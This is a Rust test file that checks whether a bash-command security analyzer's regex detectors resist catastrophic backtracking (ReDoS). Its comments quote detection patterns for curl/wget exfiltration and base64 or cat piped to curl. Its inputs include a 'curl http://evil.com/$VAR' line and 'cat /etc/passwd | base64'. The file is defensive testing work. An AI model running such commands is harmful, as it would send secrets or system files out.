//! ReDoS (Regular Expression Denial of Service) tests.
//!
//! These tests verify that regex patterns in the hook analyzer cannot be exploited
//! for catastrophic backtracking attacks.

use cc_audit::hook_mode::analyzer::HookAnalyzer;
use cc_audit::hook_mode::types::BashInput;
use std::time::{Duration, Instant};

/// Maximum acceptable time for regex matching.
/// With ~15 patterns to check sequentially, CI environments may need extra time.
/// 150ms is acceptable for complex inputs while still catching actual ReDoS issues.
const MAX_ACCEPTABLE_TIME: Duration = Duration::from_millis(150);

#[test]
fn test_redos_curl_with_many_spaces() {
    // Test pattern: (curl|wget)\s+.*\$VAR
    // Attack: curl followed by many spaces and characters
    let malicious_input = format!("curl {}", "a ".repeat(10000));

    let input = BashInput {
        command: malicious_input,
        description: None,
        timeout: None,
    };

    let start = Instant::now();
    let _findings = HookAnalyzer::analyze_bash(&input);
    let elapsed = start.elapsed();

    assert!(
        elapsed < MAX_ACCEPTABLE_TIME,
        "ReDoS detected: took {:?}, expected < {:?}",
        elapsed,
        MAX_ACCEPTABLE_TIME
    );
}

#[test]
fn test_redos_base64_with_long_input() {
    // Test pattern: base64.*\|\s*(curl|wget)
    // Attack: base64 followed by many characters before pipe
    let malicious_input = format!("base64 {}", "a".repeat(10000));

    let input = BashInput {
        command: malicious_input,
        description: None,
        timeout: None,
    };

    let start = Instant::now();
    let _findings = HookAnalyzer::analyze_bash(&input);
    let elapsed = start.elapsed();

    assert!(
        elapsed < MAX_ACCEPTABLE_TIME,
        "ReDoS detected: took {:?}, expected < {:?}",
        elapsed,
        MAX_ACCEPTABLE_TIME
    );
}

#[test]
fn test_redos_nested_command_substitution() {
    // Test pattern: \$\(.*\)
    // Attack: nested command substitutions
    let mut malicious_input = String::from("echo ");
    for _ in 0..1000 {
        malicious_input.push_str("$(");
    }
    malicious_input.push('x');
    // Don't close the parentheses to trigger backtracking

    let input = BashInput {
        command: malicious_input,
        description: None,
        timeout: None,
    };

    let start = Instant::now();
    let _findings = HookAnalyzer::analyze_bash(&input);
    let elapsed = start.elapsed();

    assert!(
        elapsed < MAX_ACCEPTABLE_TIME,
        "ReDoS detected: took {:?}, expected < {:?}",
        elapsed,
        MAX_ACCEPTABLE_TIME
    );
}

#[test]
fn test_redos_curl_with_env_var_long_name() {
    // Test pattern: (curl|wget)\s+.*\$[A-Z_][A-Z0-9_]*
    // Attack: curl with very long environment variable name
    let long_var = "A_".repeat(5000);
    let malicious_input = format!("curl http://evil.com/${}", long_var);

    let input = BashInput {
        command: malicious_input,
        description: None,
        timeout: None,
    };

    let start = Instant::now();
    let _findings = HookAnalyzer::analyze_bash(&input);
    let elapsed = start.elapsed();

    assert!(
        elapsed < MAX_ACCEPTABLE_TIME,
        "ReDoS detected: took {:?}, expected < {:?}",
        elapsed,
        MAX_ACCEPTABLE_TIME
    );
}

#[test]
fn test_redos_alternating_pattern() {
    // Test pattern with alternation that could cause backtracking
    // Attack: pattern that matches partially then fails
    let malicious_input = format!("curl {}", "a b ".repeat(5000));

    let input = BashInput {
        command: malicious_input,
        description: None,
        timeout: None,
    };

    let start = Instant::now();
    let _findings = HookAnalyzer::analyze_bash(&input);
    let elapsed = start.elapsed();

    assert!(
        elapsed < MAX_ACCEPTABLE_TIME,
        "ReDoS detected: took {:?}, expected < {:?}",
        elapsed,
        MAX_ACCEPTABLE_TIME
    );
}

#[test]
fn test_redos_cat_pipe_curl_long() {
    // Test pattern: cat\s+[^\|]+\|\s*(curl|wget)
    // Attack: very long filename
    let long_filename = "file_".repeat(5000);
    let malicious_input = format!("cat {} | curl", long_filename);

    let input = BashInput {
        command: malicious_input,
        description: None,
        timeout: None,
    };

    let start = Instant::now();
    let _findings = HookAnalyzer::analyze_bash(&input);
    let elapsed = start.elapsed();

    assert!(
        elapsed < MAX_ACCEPTABLE_TIME,
        "ReDoS detected: took {:?}, expected < {:?}",
        elapsed,
        MAX_ACCEPTABLE_TIME
    );
}

#[test]
fn test_redos_api_key_pattern_long_value() {
    // Test secret detection pattern with very long values
    let long_key = "x".repeat(10000);
    let malicious_content = format!("api_key = \"{}\"", long_key);

    let input = BashInput {
        command: format!("echo '{}'", malicious_content),
        description: None,
        timeout: None,
    };

    let start = Instant::now();
    let _findings = HookAnalyzer::analyze_bash(&input);
    let elapsed = start.elapsed();

    assert!(
        elapsed < MAX_ACCEPTABLE_TIME,
        "ReDoS detected: took {:?}, expected < {:?}",
        elapsed,
        MAX_ACCEPTABLE_TIME
    );
}

#[test]
fn test_normal_commands_are_fast() {
    // Verify that normal commands are still processed quickly
    let normal_commands = vec![
        "curl https://api.example.com",
        "wget http://example.com/file.txt",
        "cat /etc/passwd | base64",
        "sudo apt-get update",
        "echo $HOME",
        "ls -la /tmp",
    ];

    for cmd in normal_commands {
        let input = BashInput {
            command: cmd.to_string(),
            description: None,
            timeout: None,
        };

        let start = Instant::now();
        let _findings = HookAnalyzer::analyze_bash(&input);
        let elapsed = start.elapsed();

        // With ~15 regex patterns to check, 150ms per command is acceptable for CI
        // Hook mode requires <100ms total response time in production
        // CI environments may be slower, so allow 150ms for normal commands
        assert!(
            elapsed < Duration::from_millis(150),
            "Normal command took too long: {:?} for '{}'",
            elapsed,
            cmd
        );
    }
}

#[test]
fn test_input_length_limit() {
    // Verify that extremely long inputs are handled safely
    // A 1MB command should still be processed without hanging
    let huge_input = "curl ".to_string() + &"x".repeat(1024 * 1024);

    let input = BashInput {
        command: huge_input,
        description: None,
        timeout: None,
    };

    let start = Instant::now();
    let _findings = HookAnalyzer::analyze_bash(&input);
    let elapsed = start.elapsed();

    // Even a 1MB input should complete within reasonable time
    // CI environments may be slower, allow up to 500ms for 1MB input
    assert!(
        elapsed < Duration::from_millis(500),
        "Large input took too long: {:?}",
        elapsed
    );
}
